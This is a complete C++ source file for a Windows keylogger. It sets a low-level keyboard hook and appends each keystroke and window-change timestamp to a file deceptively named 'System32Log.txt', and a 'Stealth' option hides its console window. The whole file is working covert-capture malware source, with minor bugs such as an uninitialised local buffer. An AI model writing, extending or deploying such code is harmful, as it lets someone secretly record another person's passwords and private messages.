#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define visible // (visible / invisible)
// difficulty turning off in 'invisible' mode

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke, const char *file);

extern char lastwindow[256];

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN) {
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// save to file
			Save(kbdStruct.vkCode, "System32Log.txt");
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook() {
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}

void ReleaseHook() {
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke, const char *file) {
	char lastwindow[256];

	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ignore mouse clicks


	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");

	HWND foreground = GetForegroundWindow();
	if (foreground)	{
		char window_title[256];
		GetWindowText(foreground, window_title, 256);

		if (strcmp(window_title, lastwindow) != 0) {
			strcpy(lastwindow, window_title);

			fprintf(OUTPUT_FILE, "\n%d ", clock());
		}
	}

	std::cout << key_stroke << '\n';

	if (65 <= key_stroke && key_stroke <= 90)			//A-Z
		fprintf(OUTPUT_FILE, "%c %d", key_stroke + 32, key_stroke);	//소문자로 만들어주느라 +32
	else if (key_stroke == VK_BACK)
		fprintf(OUTPUT_FILE, "%s %d", "[BACKSPACE]", key_stroke);
	else if (key_stroke == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s %d", "[ENTER]", key_stroke);
	else if (key_stroke == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s %d", "[SPACE]", key_stroke);
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		fprintf(OUTPUT_FILE, "%s %d", "[CTRL]", key_stroke);
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		fprintf(OUTPUT_FILE, "%s %d", "[SHIFT]", key_stroke);
	else if (key_stroke == VK_CAPITAL)
		fprintf(OUTPUT_FILE, "%s %d", "[CAPSLOCK]", key_stroke);
	else if (key_stroke == VK_OEM_PERIOD || key_stroke == VK_DECIMAL)	// "." || 숫자패드 "."
		fprintf(OUTPUT_FILE, "%s %d", ".", key_stroke);
	else
		fprintf(OUTPUT_FILE, "%s %d", "[NULL]", key_stroke);

	fclose(OUTPUT_FILE);
	return 0;
}

void Stealth() {
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif // visible

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif // invisible
}

int main() {
	// visibility of window
	Stealth();

	// Set the hook
	SetHook();

	// loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
	}
}
